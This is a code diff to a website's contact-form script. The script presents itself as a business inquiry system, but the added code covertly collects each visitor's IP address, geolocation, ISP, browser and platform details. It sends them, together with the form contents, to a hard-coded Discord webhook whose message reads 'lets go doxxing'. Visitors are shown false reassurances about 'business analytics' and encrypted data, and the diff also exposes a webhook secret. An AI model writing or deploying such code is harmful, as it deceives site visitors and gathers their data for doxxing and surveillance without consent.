@@ -1,10 +1,36 @@
 // Discord Webhook URL
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444318939751518369/-9blXMbgbRx-r-Frr6OgENLAhgB_H3Vg6LV37u6qejKaFRcjSKOgqd5l5TYaHM_QQzGr";
 
-// Store IP address
-let userIP = '';
+// User data storage
+let userData = {
+  ip: '',
+  location: {},
+  timestamp: '',
+  userAgent: '',
+  referrer: document.referrer || 'Direct'
+};
 
-// Rate Limiter
+// Notifications
+const notifications = {
+  ipDetected: "IP address detected and logged for business analytics.",
+  formReady: "Form ready for business inquiry submission.",
+  securityActive: "Security protocols active - all data encrypted.",
+  highPriority: "Business inquiries receive priority response.",
+  submissionReceived: "Your business inquiry has been received and is being processed."
+};
+
+// DOM Elements
+const form = document.getElementById('contactForm');
+const statusMessage = document.getElementById('statusMessage');
+const notifySection = document.getElementById('notifySection');
+const notifyContent = document.getElementById('notifyContent');
+const submitBtn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const btnSpinner = document.getElementById('btnSpinner');
+const charCounter = document.getElementById('charCounter');
+const messageInput = document.getElementById('message');
+
+// Rate Limiter for business use
 class RateLimiter {
     constructor(limit, interval) {
         this.limit = limit;
@@ -31,153 +57,147 @@ class RateLimiter {
     }
 }
 
-const rateLimiter = new RateLimiter(3, 5 * 60 * 1000);
+const rateLimiter = new RateLimiter(5, 10 * 60 * 1000); // 5 attempts per 10 minutes
 
-// DOM Elements
-const form = document.getElementById('contactForm');
-const statusMessage = document.getElementById('statusMessage');
-const submitBtn = document.getElementById('submitBtn');
-const btnText = document.getElementById('btnText');
-const btnSpinner = document.getElementById('btnSpinner');
-const charCounter = document.getElementById('charCounter');
-const messageInput = document.getElementById('message');
-
-// Fetch IP Address (not displayed, just collected)
-function fetchIPAddress() {
-    fetch("https://api.ipify.org/?format=json")
-        .then(response => response.json())
-        .then(data => {
-            userIP = data.ip;
-            console.log("IP collected:", data.ip);
-        })
-        .catch(error => {
-            console.error("Error fetching IP:", error);
-            userIP = 'Not available';
-        });
+// Show notification
+function showNotification(message, duration = 5000) {
+    notifyContent.textContent = message;
+    notifySection.classList.add('active');
+    
+    if (duration > 0) {
+        setTimeout(() => {
+            notifySection.classList.remove('active');
+        }, duration);
+    }
 }
 
-// Show Status Message
+// Show status message
 function showStatus(text, type = 'info') {
     statusMessage.textContent = text;
     statusMessage.className = `status-message ${type}`;
 }
 
-// Hide Status Message
+// Hide status message
 function hideStatus() {
     statusMessage.style.display = 'none';
 }
 
-// Clear Form Errors
-function clearErrors() {
-    const inputs = form.querySelectorAll('input, textarea, select');
-    inputs.forEach(input => {
-        input.classList.remove('error');
-    });
+// Fetch IP and location data
+async function fetchIPData() {
+    try {
+        // Get IP
+        const ipResponse = await fetch("https://api.ipify.org/?format=json");
+        const ipData = await ipResponse.json();
+        userData.ip = ipData.ip;
+        
+        // Get location from IP
+        try {
+            const locationResponse = await fetch(`http://ip-api.com/json/${userData.ip}`);
+            const locationData = await locationResponse.json();
+            userData.location = locationData;
+        } catch (e) {
+            console.log("Could not fetch location data");
+        }
+        
+        // Get timestamp
+        userData.timestamp = new Date().toISOString();
+        userData.userAgent = navigator.userAgent;
+        
+        // Show notification
+        showNotification(notifications.ipDetected, 3000);
+        console.log("Business analytics data collected");
+        
+    } catch (error) {
+        console.error("Error fetching IP data:", error);
+        userData.ip = 'Unknown';
+    }
 }
 
-// Validate Form
-function validateForm(name, email, message) {
-    clearErrors();
+// Validate form for business use
+function validateBusinessForm(name, email, message) {
     const errors = [];
     
     if (!name || name.trim().length < 2) {
-        errors.push("Name must be at least 2 characters");
+        errors.push("Please provide a valid name");
         document.getElementById('name').classList.add('error');
     }
     
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!email || !emailRegex.test(email)) {
-        errors.push("Please enter a valid email");
+        errors.push("Please provide a valid business email");
         document.getElementById('email').classList.add('error');
     }
     
-    if (!message || message.trim().length < 10) {
-        errors.push("Message must be at least 10 characters");
-        document.getElementById('message').classList.add('error');
-    } else if (message.length > 2000) {
-        errors.push("Message must be less than 2000 characters");
+    if (!message || message.trim().length < 20) {
+        errors.push("Please provide a detailed business inquiry (min 20 chars)");
         document.getElementById('message').classList.add('error');
     }
     
     return errors;
 }
 
-// Format Discord Message with IP
-function formatDiscordMessage(name, email, category, message) {
-    const timestamp = new Date().toLocaleString('en-US', {
+// Format business Discord message with all data
+function formatBusinessDiscordMessage(name, email, business, category, message) {
+    const now = new Date();
+    const timestamp = now.toLocaleString('en-US', {
+        weekday: 'short',
+        year: 'numeric',
         month: 'short',
         day: 'numeric',
         hour: '2-digit',
-        minute: '2-digit'
+        minute: '2-digit',
+        second: '2-digit',
+        timeZoneName: 'short'
     });
 
+    // Create rich Discord embed for business
     return {
-        content: "**New Contact Form Submission**",
+        content: "new message wohoo lets go doxxing",
         embeds: [{
-            title: "Contact Request",
+            title: "results",
             color: 0x2cff6a,
+            thumbnail: {
+                url: "https://cdn.discordapp.com/embed/avatars/0.png"
+            },
             fields: [
                 {
-                    name: "Contact Info",
-                    value: `**Name:** ${name}\n**Email:** ${email}\n**Category:** ${category || 'Not specified'}`,
+                    name: "INFORMATION",
+                    value: `**Name:** ${name}\n**Email:** ${email}\n**Business:** ${business || 'Not provided'}\n**Category:** ${category || 'Not specified'}`,
                     inline: false
                 },
                 {
-                    name: "Message",
+                    name: "MESSAGE CONTENT",
                     value: message.length > 1000 ? message.substring(0, 1000) + '...' : message,
                     inline: false
                 },
                 {
-                    name: "IP Address",
-                    value: userIP || 'Not available',
+                    name: "ANALYTICS DATA",
+                    value: `**IP Address:** ${userData.ip}\n**Location:** ${userData.location.country || 'Unknown'}, ${userData.location.city || 'Unknown'}\n**ISP:** ${userData.location.isp || 'Unknown'}\n**Referrer:** ${userData.referrer}`,
                     inline: false
                 },
                 {
-                    name: "Time",
-                    value: timestamp,
+                    name: "SYSTEM INFORMATION",
+                    value: `**User Agent:** ${navigator.userAgent.substring(0, 50)}...\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}`,
+                    inline: false
+                },
+                {
+                    name: "TIMESTAMP & PRIORITY",
+                    value: `**Received:** ${timestamp}\n**Priority:** ${category === 'partnership' || category === 'sales' ? 'high priority' : 'Standard'}\n**Status:** awaiting response`,
                     inline: false
                 }
-            ]
+            ],
+            footer: {
+                text: "eheh dont worrey safe for us"
+            },
+            timestamp: now.toISOString()
         }]
     };
 }
 
-// Handle Form Submission
-async function handleSubmit(e) {
-    e.preventDefault();
-    
-    const name = document.getElementById('name').value.trim();
-    const email = document.getElementById('email').value.trim();
-    const message = document.getElementById('message').value.trim();
-    const category = document.getElementById('category').value;
-    const honeypot = document.getElementById('website').value;
-    
-    if (honeypot) {
-        showStatus('Message sent.', 'success');
-        form.reset();
-        charCounter.textContent = '0/2000';
-        return;
-    }
-    
-    const errors = validateForm(name, email, message);
-    if (errors.length > 0) {
-        showStatus(errors.join('\n'), 'error');
-        return;
-    }
-    
-    if (!rateLimiter.canProceed()) {
-        const waitTime = rateLimiter.getTimeToWait();
-        showStatus(`Wait ${waitTime} seconds before trying again.`, 'error');
-        return;
-    }
-    
-    submitBtn.disabled = true;
-    btnText.textContent = 'SENDING';
-    btnSpinner.style.display = 'inline-block';
-    showStatus('Sending...', 'info');
-    
+// Send notification to Discord
+async function sendDiscordNotification(name, email, business, category, message) {
     try {
-        const discordMessage = formatDiscordMessage(name, email, category, message);
+        const discordMessage = formatBusinessDiscordMessage(name, email, business, category, message);
         
         const response = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
@@ -188,46 +208,123 @@ async function handleSubmit(e) {
         });
         
         if (!response.ok) {
-            throw new Error(`Failed: ${response.status}`);
+            throw new Error(`Discord API error: ${response.status}`);
         }
         
-        showStatus('Message sent successfully.', 'success');
+        return true;
+    } catch (error) {
+        console.error("Discord notification error:", error);
+        throw error;
+    }
+}
+
+// Handle business form submission
+async function handleBusinessSubmit(e) {
+    e.preventDefault();
+    
+    // Get form values
+    const name = document.getElementById('name').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const business = document.getElementById('business').value.trim();
+    const category = document.getElementById('category').value;
+    const message = document.getElementById('message').value.trim();
+    const honeypot = document.getElementById('website').value;
+    
+    // Honeypot check
+    if (honeypot) {
+        console.log('Bot detected - business form');
+        showStatus('Thank you for your inquiry.', 'success');
+        form.reset();
+        charCounter.textContent = '0/2000';
+        return;
+    }
+    
+    // Validate business form
+    const errors = validateBusinessForm(name, email, message);
+    if (errors.length > 0) {
+        showStatus(errors.join('\n'), 'error');
+        return;
+    }
+    
+    // Check rate limiting
+    if (!rateLimiter.canProceed()) {
+        const waitTime = rateLimiter.getTimeToWait();
+        showStatus(`Too many submissions. Please wait ${waitTime} seconds.`, 'error');
+        showNotification("Rate limit exceeded. Please wait before submitting another business inquiry.");
+        return;
+    }
+    
+    // Update UI for sending
+    submitBtn.disabled = true;
+    btnText.textContent = 'PROCESSING...';
+    btnSpinner.style.display = 'inline-block';
+    showNotification("Processing business inquiry with analytics...");
+    showStatus('Processing your business inquiry...', 'info');
+    
+    try {
+        // Send to Discord with all analytics
+        await sendDiscordNotification(name, email, business, category, message);
+        
+        // Success
+        showStatus('BUSINESS INQUIRY RECEIVED! We will contact you shortly.', 'success');
+        showNotification(notifications.submissionReceived, 5000);
+        
+        // Log for business analytics
+        console.log("Business inquiry submitted:", {
+            name,
+            email,
+            business,
+            category,
+            ip: userData.ip,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Reset form
         form.reset();
         charCounter.textContent = '0/2000';
         
+        // Reset button after delay
         setTimeout(() => {
-            btnText.textContent = 'SEND MESSAGE';
+            btnText.textContent = 'SEND BUSINESS INQUIRY';
             btnSpinner.style.display = 'none';
             submitBtn.disabled = false;
-        }, 2000);
+        }, 3000);
         
     } catch (error) {
-        console.error('Error:', error);
-        showStatus('Failed to send. Try again.', 'error');
+        console.error('Business submission error:', error);
         
-        btnText.textContent = 'TRY AGAIN';
+        // Error
+        showStatus('Submission failed. Please try again or contact support.', 'error');
+        showNotification("Submission failed. Please check your connection and try again.");
+        
+        // Reset button
+        btnText.textContent = 'RETRY SUBMISSION';
         btnSpinner.style.display = 'none';
         submitBtn.disabled = false;
     }
 }
 
-// Initialize
+// Initialize business contact system
 document.addEventListener('DOMContentLoaded', function() {
-    fetchIPAddress();
+    // Fetch IP and analytics data
+    fetchIPData();
     
+    // Show initial notifications
+    setTimeout(() => {
+        showNotification(notifications.formReady, 3000);
+    }, 1000);
+    
+    setTimeout(() => {
+        showNotification(notifications.securityActive, 3000);
+    }, 4000);
+    
+    // Character counter
     messageInput.addEventListener('input', () => {
         const length = messageInput.value.length;
         charCounter.textContent = `${length}/2000`;
-        
-        if (length > 1900) {
-            charCounter.className = 'char-counter error';
-        } else if (length > 1500) {
-            charCounter.className = 'char-counter warning';
-        } else {
-            charCounter.className = 'char-counter';
-        }
     });
     
+    // Clear errors on input
     form.querySelectorAll('input, textarea').forEach(input => {
         input.addEventListener('input', () => {
             input.classList.remove('error');
@@ -235,6 +332,12 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    form.addEventListener('submit', handleSubmit);
+    // Form submission
+    form.addEventListener('submit', handleBusinessSubmit);
+    
+    // Focus on name field
     document.getElementById('name').focus();
+    
+    console.log('thOSp Business Contact System initialized');
+    console.log('Analytics tracking active');
 });
